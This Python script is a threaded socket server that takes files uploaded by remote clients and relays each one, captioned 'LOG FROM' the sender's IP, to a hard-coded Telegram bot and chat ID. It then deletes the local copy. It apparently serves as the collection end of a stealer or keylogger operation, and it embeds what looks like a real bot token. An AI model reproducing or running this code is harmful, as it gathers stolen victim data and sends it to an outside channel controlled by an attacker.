import socket, tqdm, telebot, os
from _thread import *
from requests import get

ServerSideSocket = socket.socket()
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"
TOKEN = "1888960464:AAFi4PtqqjqprmU3h9m4VnsC30lqmXtH3ho"
MYID = "1391993288"

bot = telebot.TeleBot(TOKEN)
host = get('https://api.ipify.org').text
port = 12345



ThreadCount = 0
try:
    ServerSideSocket.bind((host, port))
except socket.error as e:
    ServerSideSocket.bind(("localhost", port))
    print(str(e))

bot.send_message(chat_id=MYID,text=f"[#INITIALIZED_NEW_SERVER]\n\n{host}:{port}")

print(f"SERVER READY\nListening on: {host}:{port}\n\nReady to work..")
ServerSideSocket.listen(5)

def multi_threaded_client(connection, address):
   try:
      received = connection.recv(BUFFER_SIZE)
      print(str(received))
      filename, filesize = str(received).split(SEPARATOR)
      filename = os.path.basename(filename)
      filesize = int(filesize.replace("'",""))
      progress = tqdm.tqdm(range(filesize), f"Retargeting:", unit="B", unit_scale=True, unit_divisor=1024)
      with open(filename, "wb") as f:
         while True:
            bytes_read = connection.recv(BUFFER_SIZE)
            if not bytes_read:    
               break
            f.write(bytes_read)
            progress.update(len(bytes_read))
      f1 = open(filename,"rb")
      bot.send_document(MYID, f1,caption=f"LOG FROM {address[0]}")
      f1.close()
      connection.close()
      os.unlink(f1.name)
   except Exception as e:
      print(f"ERROR: {e}")

while True:
    Client, address = ServerSideSocket.accept()
    start_new_thread(multi_threaded_client, (Client, address, ))
ServerSideSocket.close()
